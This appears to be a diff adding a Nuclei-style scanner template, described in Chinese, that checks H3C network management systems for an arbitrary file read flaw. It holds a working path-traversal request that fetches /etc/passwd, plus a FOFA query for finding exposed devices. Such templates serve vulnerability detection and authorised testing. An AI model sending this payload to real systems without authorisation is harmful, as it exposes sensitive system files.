@@ -1,0 +1,27 @@
+id: H3C-net-manage-system
+info:
+  name: H3C网络管理系统存在任意文件读取
+  author: mike
+  severity: info
+  description: H3C是一家新IT解决方案提供商，致力于成为客户业务创新、数字化转型最可信赖的合作伙伴。主营产品有路由器，大数据，交换机，物联网，云计算，服务器等。H3C 网管系统存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。
+  reference: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: body="webui/js/jquerylib/jquery-1.7.2.min.js"
+http:
+  - raw:
+      - |
+        GET /webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root"
